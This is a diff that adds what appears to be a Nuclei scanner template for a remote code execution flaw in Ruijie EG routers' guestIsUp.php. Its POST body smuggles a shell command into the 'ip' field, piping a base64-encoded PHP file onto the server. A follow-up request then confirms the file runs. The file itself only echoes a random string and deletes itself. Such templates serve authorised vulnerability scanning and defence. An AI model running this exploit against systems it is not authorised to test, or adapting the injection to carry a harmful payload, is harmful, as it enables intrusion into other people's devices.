@@ -1,0 +1,43 @@
+id: ruijie-eg-guestisup-ip-rce
+info:
+  name: Ruijie EG GuestIsUp IP RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploitation of a remote code execution vulnerability in Ruijie EG GuestIsUp.php. This script uploads a temporary harmless file and can execute self-deletion logic.
+  reference:
+    - https://xz.aliyun.com/t/9016?page=1
+
+variables:
+  r1: '{{rand_text_alpha(8)}}'
+  r2: '{{rand_text_alpha(8)}}'
+  phpcode: |
+    <?php echo "{{r1}}"; unlink(__FILE__); ?>
+  payload: '{{base64(phpcode)}}'
+
+http:
+  - id: upload-php
+    method: POST
+    path:
+      - '{{BaseURL}}/guest_auth/guestIsUp.php'
+    headers:
+      Accept-Encoding: gzip, deflate
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      ip=127.0.0.1|echo '{{payload}}' | base64 -d > {{r2}}.php&mac=00-00
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-php
+    method: GET
+    path:
+      - '{{BaseURL}}/guest_auth/{{r2}}.php'
+    headers:
+      Accept-Encoding: gzip, deflate
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{{r1}}'
